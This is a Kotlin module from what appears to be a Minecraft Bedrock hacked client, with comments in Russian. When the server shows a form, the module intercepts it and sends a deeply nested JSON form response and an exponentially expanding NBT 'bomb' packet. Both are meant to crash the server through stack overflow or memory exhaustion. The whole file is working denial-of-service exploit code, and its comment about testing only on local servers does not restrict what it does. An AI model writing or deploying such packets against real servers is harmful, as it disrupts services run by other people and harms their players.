package com.retrivedmods.wclient.game.module.misc

import com.retrivedmods.wclient.game.InterceptablePacket
import com.retrivedmods.wclient.game.Module
import com.retrivedmods.wclient.game.ModuleCategory
import com.nukkitx.math.vector.Vector3i
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.cloudburstmc.nbt.NbtMap // <<< ИЗМЕНЕНО: Используем правильный NbtMap
import org.cloudburstmc.protocol.bedrock.packet.BlockEntityDataPacket
import org.cloudburstmc.protocol.bedrock.packet.ModalFormRequestPacket
import org.cloudburstmc.protocol.bedrock.packet.ModalFormResponsePacket

/**
 * Модуль для продвинутого тестирования уязвимостей сервера с использованием
 * алгоритмических атак ("бомб"), вызывающих высокую нагрузку на CPU/RAM.
 * 
 * ВНИМАНИЕ: NBT-бомба является очень мощной атакой. Небольшое увеличение
 * глубины/ширины может привести к потреблению гигабайт оперативной памяти.
 * Используйте с осторожностью только на локальном тестовом сервере.
 */
class AnomalousPacketTester : Module("AnomalousPacketTester", ModuleCategory.Misc) {

    // --- Настройки ---
    private val testWithDeepJson by boolValue("Test Deep JSON Bomb", true)
    private val testWithNbtBomb by boolValue("Test NBT Bomb", true)
    
    private val attackDelay by longValue("Attack Delay (ms)", 200, 50, 2000)
    
    // Настройки для JSON-бомбы
    private val jsonNestingDepth by intValue("JSON Nesting Depth", 800, 100, 5000)

    // Настройки для NBT-бомбы
    private val nbtBombDepth by intValue("NBT Bomb Depth", 12, 5, 20) // Глубина вложенности
    private val nbtBombWidth by intValue("NBT Bomb Width", 10, 5, 20) // Количество элементов на каждом уровне

    override fun onEnabled() {
        super.onEnabled()
        session.displayClientMessage("§a[AnomalousTester] Модуль включен. Ожидание формы-триггера.")
    }

    override fun onDisabled() {
        super.onDisabled()
        session.displayClientMessage("§c[AnomalousTester] Модуль выключен.")
    }

    override fun beforePacketBound(interceptablePacket: InterceptablePacket) {
        if (!isEnabled) return

        val packet = interceptablePacket.packet
        if (packet is ModalFormRequestPacket) {
            interceptablePacket.intercept() // Блокируем показ формы
            
            session.displayClientMessage("§6[AnomalousTester] Форма перехвачена! Запускаю аномальную атаку...")

            GlobalScope.launch {
                if (testWithDeepJson) {
                    sendDeeplyNestedFormResponse(packet.formId)
                    delay(attackDelay)
                }
                if (testWithNbtBomb) {
                    sendNbtBombPacket()
                }
                session.displayClientMessage("§a[AnomalousTester] Атака завершена. Проверяйте состояние сервера.")
            }
        }
    }

    /**
     * Атака "JSON-бомба": отправляет JSON с экстремальной глубиной вложенности.
     * Цель: вызвать StackOverflowError или занять CPU на долгое время.
     */
    private fun sendDeeplyNestedFormResponse(formId: Int) {
        try {
            val responsePacket = ModalFormResponsePacket()
            responsePacket.formId = formId

            var maliciousJson = "\"leaf\""
            for (i in 1..jsonNestingDepth) {
                maliciousJson = "{\"key\":$maliciousJson}"
            }
            responsePacket.formData = maliciousJson
            
            session.sendPacket(responsePacket)
            session.displayClientMessage("§e[AnomalousTester] Отправлена JSON-бомба (глубина: $jsonNestingDepth).")
        } catch (e: Exception) {
            session.displayClientMessage("§c[AnomalousTester] Ошибка при отправке JSON-бомбы: ${e.message}")
        }
    }

    /**
     * Атака "NBT-бомба": отправляет NBT-структуру, которая экспоненциально расширяется в памяти.
     * Цель: вызвать OutOfMemoryError на сервере.
     * 
     * ИСПОЛЬЗУЕТ org.cloudburstmc.nbt.NbtMap
     */
    private fun sendNbtBombPacket() {
        try {
            val nbtPacket = BlockEntityDataPacket()
            nbtPacket.blockPosition = Vector3i.ZERO // Координаты не важны

            // 1. Создаем "полезную нагрузку" - самый глубокий элемент. Это может быть любой простой тип.
            val payload: Any = "payload_data"

            // 2. Рекурсивно оборачиваем нагрузку в обычные списки (List).
            // NbtMap может сериализовать стандартные списки.
            var currentLevel: Any = payload
            for (d in 1..nbtBombDepth) {
                val nextLevel = mutableListOf<Any>()
                for (w in 1..nbtBombWidth) {
                    // Добавляем весь предыдущий уровень как один элемент нового списка.
                    nextLevel.add(currentLevel)
                }
                // Теперь новый, более крупный список становится текущим уровнем для следующей итерации.
                currentLevel = nextLevel
            }
            
            // 3. Создаем корневой NbtMap и помещаем в него нашу "бомбу".
            val root = NbtMap.builder()
                .put("bomb", currentLevel) // `currentLevel` здесь - это огромный вложенный список
                .build()

            nbtPacket.tag = root
            
            session.sendPacket(nbtPacket)
            val totalElements = Math.pow(nbtBombWidth.toDouble(), nbtBombDepth.toDouble()).toLong()
            session.displayClientMessage("§e[AnomalousTester] Отправлена NBT-бомба (глубина: $nbtBombDepth, ширина: $nbtBombWidth, ~${totalElements} элементов).")
        } catch (e: Exception) {
            session.displayClientMessage("§c[AnomalousTester] Ошибка при отправке NBT-бомбы: ${e.message}")
        }
    }
}
